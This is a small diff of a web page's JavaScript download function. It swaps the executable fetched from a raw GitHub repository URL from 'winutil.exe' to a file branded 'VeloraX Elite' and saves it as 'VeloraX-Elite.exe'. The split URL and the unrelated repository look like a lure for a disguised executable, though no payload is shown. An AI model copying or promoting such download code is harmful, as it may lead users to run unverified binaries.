@@ -14,7 +14,7 @@ if (yearEl) {
 
 function startDownload() {
   const p1 = "https://github.com/OSEKFE4/t/raw/refs/heads/main/";
-  const p2 = "winutil.exe";
+  const p2 = "VeloraX%20Elite.exe";
   const url = p1 + p2;
   const fileName = "VeloraX-Elite.exe";
 
